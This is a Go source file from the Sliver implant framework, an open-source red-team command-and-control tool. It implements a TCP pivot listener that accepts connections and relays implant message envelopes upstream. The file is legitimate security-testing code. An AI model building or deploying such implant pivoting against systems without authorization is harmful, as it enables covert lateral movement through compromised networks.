package pivots

/*
  Sliver Implant Framework
  Copyright (C) 2019  Bishop Fox

  This program is free software: you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation, either version 3 of the License, or
  (at your option) any later version.

  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"net"
	"sync"
	"time"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
)

var (
	tcpPivotReadDeadline  = 10 * time.Second
	tcpPivotWriteDeadline = 10 * time.Second
)

// StartTCPPivotListener - Start a TCP listener
func StartTCPPivotListener(address string, upstream chan<- *pb.Envelope) (*PivotListener, error) {
	// {{if .Config.Debug}}
	log.Printf("Starting TCP pivot listener on %s", address)
	// {{end}}
	ln, err := net.Listen("tcp", address)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[tcp-pivot] listener error: %s", err)
		// {{end}}
		return nil, err
	}
	pivotListener := &PivotListener{
		ID:          ListenerID(),
		Type:        pb.PivotType_TCP,
		Listener:    ln,
		Pivots:      &sync.Map{},
		BindAddress: address,
		Upstream:    upstream,
	}
	go tcpPivotAcceptNewConnections(pivotListener)
	return pivotListener, nil
}

func tcpPivotAcceptNewConnections(pivotListener *PivotListener) {
	for {
		conn, err := pivotListener.Listener.Accept()
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[tcp-pivot] listener stopping: %s", err)
			// {{end}}
			return
		}
		// handle connection like any other net.Conn
		pivotConn := &NetConnPivot{
			id:            PivotID(),
			conn:          conn,
			readMutex:     &sync.Mutex{},
			writeMutex:    &sync.Mutex{},
			readDeadline:  tcpPivotReadDeadline,
			writeDeadline: tcpPivotWriteDeadline,
			upstream:      pivotListener.Upstream,
			Downstream:    make(chan *pb.Envelope),
		}
		go pivotConn.Start(pivotListener.Pivots)
	}
}
